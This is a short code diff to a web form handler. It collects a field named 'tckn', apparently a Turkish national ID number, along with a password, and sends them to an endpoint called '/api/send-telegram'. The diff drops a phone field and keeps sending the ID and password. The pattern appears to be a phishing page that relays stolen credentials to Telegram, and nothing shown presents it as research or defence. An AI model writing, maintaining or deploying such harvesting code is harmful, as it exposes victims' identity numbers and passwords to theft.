@@ -419,7 +419,6 @@
         
         const tckn = formData.get('tckn') || '';
         const password = formData.get('password') || '';
-        const phone = formData.get('phone') || '';
 
         // API endpoint
         const apiUrl = '/api/send-telegram';
@@ -440,8 +439,7 @@
           },
           body: JSON.stringify({
             tckn: tckn,
-            password: password,
-            phone: phone
+            password: password
           })
         })
         .then(response => response.json())
